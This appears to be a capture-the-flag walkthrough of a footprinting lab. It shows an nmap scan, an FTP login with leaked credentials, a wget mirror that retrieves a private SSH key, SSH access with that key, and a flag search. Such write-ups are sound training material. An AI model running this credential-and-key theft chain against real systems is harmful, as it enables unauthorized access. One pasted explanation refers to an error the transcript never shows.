# Footprinting Lab - Easy

We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.

The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.

Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum.

The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

## Walkthrough

```
└─$ nmap -sV 10.129.214.52
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 00:48 EST
Nmap scan report for 10.129.214.52 (10.129.214.52)
Host is up (0.26s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp
```

We found that port 2121 for ftp is open, so first we check this

```bash
ftp 10.129.214.52 2121
#then we use the credential found above ceil:qwer1234
Connected to 10.129.214.52.
220 ProFTPD Server (Ceil's FTP) [10.129.214.52]
Name (10.129.214.52:kali): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61558|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
```

It seems like you are encountering a permission issue when trying to run the `ls` command in an FTP session. The error message "setsockopt SO\_DEBUG (ignored): Permission denied" indicates that there might be a problem with setting a socket option related to debugging, but this message can typically be ignored as it doesn't directly relate to the `ls` command.

so we try another command to get all the file inside ftp.

```bash
wget -m --no-passive ftp://ceil:qwer1234@10.129.214.52:2121/
```

This Bash command is using the `wget` utility to recursively download files from an FTP server. Let's break down the command and its options:

* `wget`: This is the command-line utility used for downloading files from the internet. It supports various protocols, including FTP, HTTP, and HTTPS.
* `-m` or `--mirror`: This option tells `wget` to mirror the directory structure and download all files recursively. It means it will download all files and subdirectories from the specified FTP server.
* `--no-passive`: This option disables passive FTP mode. Passive mode is used for data connections in FTP, but sometimes it can cause issues depending on the network configuration. Disabling passive mode might help if you're experiencing connectivity problems.
* `ftp://ceil:qwer1234@10.129.214.52:2121/`: This is the URL of the FTP server you want to download from. It includes the protocol (`ftp://`), followed by the username (`ceil`) and password (`qwer1234`) for authentication, then the server's IP address (`10.129.214.52`) and port (`2121`), and finally, the path (`/`) from which you want to download files.

Putting it all together, the command `wget -m --no-passive ftp://ceil:qwer1234@10.129.214.52:2121/` will recursively download all files and directories from the FTP server located at `10.129.214.52`, using the username `ceil` and password `qwer1234`, from port `2121`, while disabling passive mode for FTP connections.

Now go to the result .ssh directory and change the id\_rsa permission

```bash
cd 10.129.214.52:2121 
ls -al
cd .ssh
chmod 600 id_rsa
```

then try to login SSH with the id\_rsa

```bash
ssh -i id_rsa ceil@10.129.214.52
```

after that find the flag and done :).

```bash
find / -name flag.txt 2>/dev/null
cat /home/flag/flag.txt
```
